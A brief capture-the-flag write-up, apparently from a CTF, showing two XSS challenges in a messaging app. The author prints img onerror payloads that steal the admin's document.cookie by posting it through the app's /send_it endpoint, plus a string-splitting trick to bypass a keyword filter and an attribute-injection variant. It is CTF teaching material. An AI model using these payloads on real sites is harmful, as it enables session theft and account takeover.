### XSS

## XXE1

When we try to send ```html <img src="_" onerror="alert('oh hi :D')">``` we notice two thing

One a request is sent to the id of the user we message to with the message
![3.png](asset/3.png)

![1.png](asset/1.png)
Two we can see that xss work so we can try to add the following payload to send a the admin cookie to us with the send_it API to us (id)

```html
<img src="_" onerror="fetch('/send_it',{headers:{['content-type']:'application/x-www-form-urlencoded'},body:'id=280&content='+encodeURIComponent('cookie:'+document.cookie),method:'POST',mode:'cors',credentials:'include'})">
```

We however see that the payload do not work and some part of the payload were replaced

![4.png](asset/4.png)

```html
<img src="_" onerror="fetch('/send_it',{headers:{['co'+'ntent-type']:'application/x-www-form-urlencoded'},body:'id=280&co'+'ntent='+encodeURIComponent('cookie:'+document.cookie),method:'POST',mode:'cors',credentials:'include'})">
```

So we will change it a bit to concat the string to bypass the issue

![2.png](asset/2.png)

>[!IMPORTANT]
BFS{XSS_M0R3_L!K3_FR33_C00K!35}

## XXE2

When we try to send an image we can see that a few ellement are append automatically to our message namely the end double quote for our source image and the ending >

```html
_" onerror="fetch('/send_it',{headers:{['co'+'ntent-type']:'application/x-www-form-urlencoded'},body:'id=64&co'+'ntent='+encodeURIComponent('cookie:'+document.cookie)+'&option=message',method:'POST',mode:'cors',credentials:'include'})
```
>[!IMPORTANT]
BFS{4n_1m4g3_79_w0r7h_a_7h0u54nd_w0rd5}
